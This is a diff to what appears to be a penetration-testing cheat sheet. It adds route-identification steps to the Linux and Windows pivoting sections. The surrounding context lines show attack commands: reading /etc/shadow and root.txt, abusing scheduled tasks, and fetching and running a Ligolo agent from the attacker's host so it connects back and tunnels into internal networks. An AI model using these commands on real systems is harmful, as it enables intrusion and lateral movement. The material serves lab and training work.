@@ -1320,6 +1320,10 @@ find / -name 'root.txt' -readable -exec echo {} \; -exec cat {} \; 2>/dev/null
 cat /etc/shadow
 
 [*] Pivoting
+-->> Identify Routes
+route
+ipcalc 172.16.1.0/255.255.255.0
+
 -->> Ligolo: New Configuration
 sudo ligolo-proxy -selfcert -laddr 0.0.0.0:8080
 curl $MYIP/linux/agent -o /dev/shm/agent; chmod +x /dev/shm/agent; /dev/shm/agent -ignore-cert -connect $MYIP:8080
@@ -1529,6 +1533,10 @@ powershell -c "$task = Get-ScheduledTask -TaskName 'Ownership'; $task.Actions; $
 powershell -c "Start-ScheduledTask -TaskName 'Ownership'"
 
 [*] Pivoting
+-->> Identify Routes
+print route
+ipcalc 172.16.1.0/255.255.255.0
+
 -->> Ligolo: New Configuration
 sudo ligolo-proxy -selfcert -laddr 0.0.0.0:8080
 curl $MYIP/windows/agent.exe -o \programdata\agent.exe && C:\programdata\agent.exe -ignore-cert -connect $MYIP:8080
